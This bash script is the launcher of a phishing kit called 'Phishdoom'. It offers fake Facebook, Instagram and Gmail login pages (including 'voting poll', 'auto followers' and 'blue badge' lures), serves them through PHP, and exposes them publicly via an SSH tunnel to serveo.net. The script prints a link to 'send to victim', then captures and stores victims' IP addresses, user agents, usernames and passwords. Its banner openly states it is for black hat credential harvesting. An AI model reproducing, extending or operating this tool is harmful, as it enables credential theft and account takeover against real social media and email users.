#!/bin/bash
red='\033[0;31m'
green='\033[0;32m'
reset='\033[0m'  
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed! Install it."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed! Install it."; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "OpenSSH is not installed! Install it."; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed! Install it."; exit 1; }
}

menu() {
    clear
    banner
    sleep 0.75
    printf "[01] Facebook\n"
    printf "[02] Instagram\n"
    printf "[03] Gmail\n"

    read -p 'Select an option: ' option

    if [[ $option == 1 || $option == 01 ]]; then
        clear
        facebook
    elif [[ $option == 2 || $option == 02 ]]; then
        clear
        instagram
    elif [[ $option == 3 || $option == 03 ]]; then
        clear
        gmail
    else
        printf "[x] Invalid option\n"
        sleep 1
        menu
    fi
}

facebook() {
    clear
    banner
    sleep 0.75	 
    printf "[01] Traditional Login Page\n"
    printf "[02] Advanced Voting Poll Login Page\n"
    printf "[03] Fake Security Login Page\n"
    printf "[04] Facebook Messenger Login Page\n"

    read -p 'Select an option: ' option
    if [[ $option == 1 || $option == 01 ]]; then
        server="facebook"
        clear
        start
    elif [[ $option == 2 || $option == 02 ]]; then
        server="fb_advanced"
        clear
        
        start
    elif [[ $option == 3 || $option == 03 ]]; then
        server="fb_security"
        clear
        start
    elif [[ $option == 4 || $option == 04 ]]; then
        server="fb_messenger"
        clear
        start
    else
        printf "[x] Invalid option\n"
        sleep 1
        menu
    fi
}

instagram() {
    clear
    banner
    sleep 0.75
    printf "[01] Traditional Login Page\n"
    printf "[02] Auto Followers Login Page\n"
    printf "[03] Blue Badge Verify Login Page\n"

    read -p 'Select an option: ' option
    if [[ $option == 1 || $option == 01 ]]; then
        server="instagram"
        clear
        start
    elif [[ $option == 2 || $option == 02 ]]; then
        server="ig_followers"
        clear
        start
    elif [[ $option == 3 || $option == 03 ]]; then
        server="ig_verify"
        clear
        start
    else
        printf "[x] Invalid option\n"
        sleep 1
        menu
    fi
}

gmail() {
    clear
    banner
    sleep 0.75
    printf "[01] Gmail Old Login Page\n"
    printf "[02] Gmail New Login Page\n"
    printf "[03] Advanced Voting Poll\n"

    read -p 'Select an option: ' option
    if [[ $option == 1 || $option == 01 ]]; then
        server="google"
        clear
        start
    elif [[ $option == 2 || $option == 02 ]]; then
        server="google_new"
        clear
        start
    elif [[ $option == 3 || $option == 03 ]]; then
        server="google_poll"
        clear
        start
    else
        printf "[x] Invalid option\n"
        sleep 1
        menu
    fi
}

stop() {
    pkill -f php > /dev/null 2>&1
    pkill -f ssh > /dev/null 2>&1
    [[ -e linksender ]] && rm -rf linksender
}

start() {
    [[ -e linksender ]] && rm -rf linksender

    # Linux setup for required tools and dependencies
    linux_setup() {
        sudo apt update && sudo apt upgrade -y
        sudo apt install wget curl php unzip openssh git -y
        printf "\n[*] Linux setup complete.\n"
        dependencies
        menu
    }

    start_s
}

start_s() {
    banner
    [[ -e sites/$server/ip.txt ]] && rm -rf sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -rf sites/$server/usernames.txt
    def_port="5555"

    read -p "Enter port [default: $def_port]: " port
    port="${port:-${def_port}}"
    start_serveo
}

start_serveo() {
    clear
    banner
    sleep 0.75
    printf "\n[*] Initializing ... localhost:$port\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2

    printf "[*] Launching Serveo...\n"
    [[ -e linksender ]] && rm -rf linksender
    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > linksender" &
    sleep 7
    send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)

    printf '[*] Send the link to victim: %s' "$send_url"
    found
    
}
banner() {

    # Placeholder for banner function; add your banner logic here

    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢉⣡⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀⢸⣇⠀⠀"
    printf "%s\n" "⠀⠙⣿⣷⣦⡀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⠋⠉⣿⠟⠁⠀⠀⢸⡟⠀⠀"
    printf "%s\n" "⠀⠀⢸⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⠁⠀⠀⣷⡄⢸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⣿⠁⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⢿⣀⣸⡇⠀⠀"
    printf "%s\n" "⠀⠀⠀⣿⣷⣤⣈⠛⠻⢿⣿⡿⢀⣼⣿⣿⡿⠛⣿⣿⣿⣦⣄⡀⠈⠉⠉⠁⠀⠀"
    printf "%s\n" "⠀⠀⢀⣿⡿⠟⠁⠀⠀⠀⠀⠀⠛⠉⠉⠠⠤⠾⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀"
    printf "%s\n" "⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"

    printf "%s\n" "_____________________________________  ________________________"
    printf "%s\n" "7     77  7  77  77     77  7  77    \\ 7     77     77        7"
    printf "%s\n" "|  -  ||  !  ||  ||  ___!|  !  ||  7  ||  7  ||  7  ||  _  _  |"
    printf "%s\n" "|  ___!|     ||  |!__   7|     ||  |  ||  |  ||  |  ||  7  7  |"
    printf "%s\n" "|  7   |  7  ||  |7     ||  7  ||  !  ||  !  ||  !  ||  |  |  |"
    printf "%s\n" "!__!   !__!__!!__!!_____!!__!__!!_____!!_____!!_____!!__!__!__!"
    printf "%s\n"
    printf "%s\n" "+-----------------------------------------------------------------------------------------------------+"
    printf "%s\n" "| Phishdoom is a phishing tool designed for targeting social media accounts such as Facebook,       |"
    printf "%s\n" "| Instagram, and Gmail, enabling black hat hackers to harvest credentials and access sensitive      |"
    printf "%s\n" "| information.                                                                                      |"
     printf "%s\n" "+-----------------------------------------------------------------------------------------------------+" 
    printf "%s\n" "Copyright: @ALHARAM"
    printf "%s\n" "v2.3"
    printf "%s\n"
}

found() {
    printf "\n[*] Checking for files...\n"	
    sleep 0.7
    printf "\n[*] Waiting for Login Info Press [ Ctrl + C ] to exit...\n"
    while true; do
        
        if [[ -e "sites/$server/ip.txt" ]]; then
        
            printf "\n${green}[*] Victim IP Found!\n"
            c_ip
            rm -rf "sites/$server/ip.txt"
        fi
        sleep 0.75
        
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "${green}[*] Login info Found!\n"
            c_cred
            rm -rf "sites/$server/usernames.txt"
        fi
        sleep 0.75
    done
}

c_ip() {
touch sites/$server/login_info.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)

printf "============================================================================="
printf "\n"
printf "${red}>> Victim IP: %s" $ip
printf "\n"
printf "\n${green}[*] Saved: sites/%s/victim_ip.txt\n" $server
printf "============================================================================="
printf "\n"
cat sites/$server/ip.txt >> sites/$server/victim_ip.txt
}

c_cred() {
account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "============================================================================="
printf "\n"
printf "${red}>> Account: %s\n" "$account"

printf "\n"
printf "${red}>> Password: %s\n" "$password"

cat sites/$server/usernames.txt >> sites/$server/login_info.txt
printf "\n${green}[*] Saved: sites/%s/login_info.txt\n" $server
printf "============================================================================="
printf "\n[*] Waiting for Next Login Info, Press [ Ctrl + C ] to exit...\n"
}

# Main script execution
banner
dependencies
menu
